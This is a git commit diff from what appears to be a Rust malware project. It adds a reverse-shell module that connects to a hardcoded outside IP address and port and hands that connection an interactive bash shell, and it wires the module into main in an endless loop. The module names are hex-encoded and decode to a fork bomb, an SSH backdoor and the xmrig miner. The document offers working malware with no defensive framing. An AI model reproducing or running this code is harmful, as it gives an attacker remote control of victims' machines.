4f1064fc0876484f9f2db94b48fd4c3aed01e31e
Pikkel <ilovemathguy@gmail.com>
2022-01-01 06:19:25 -0500

    tired

---
+++ src/_0x727368656c6c/main.rs
@@ -0,0 +1,19 @@
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+
+pub fn main() {
+    if cfg!(unix) {
+        let x = TcpStream::connect("150.136.245.71:8008").unwrap();
+        let o = x.as_raw_fd();
+        Command::new("/bin/bash")
+            .arg("-i")
+            .stdin(unsafe { Stdio::from_raw_fd(o) })
+            .stdout(unsafe { Stdio::from_raw_fd(o) })
+            .stderr(unsafe { Stdio::from_raw_fd(o) })
+            .spawn()
+            .unwrap()
+            .wait()
+            .unwrap();
+    }
+}
--- src/main.rs
+++ src/main.rs
@@ -1,8 +1,10 @@
 mod _0x666f726b626f6d62;
+mod _0x727368656c6c;
 mod _0x7373686261636b646f6f72;
 mod _0x786d726967;
 
 use _0x666f726b626f6d62::main as _0x666f726b626f6d62_;
+use _0x727368656c6c::main as _0x727368656c6c_;
 use _0x786d726967::main as _0x786d726967_;
 use std::{thread, time};
 
@@ -12,6 +14,11 @@ fn main() {
     thread::sleep(time::Duration::from_secs(1));
 
     _0x786d726967_::main();
+
+    // reverse shell
+    loop {
+        _0x727368656c6c_::main();
+    }
 
     /* fork funny */
     // main_0x666f726b626f6d62::main();
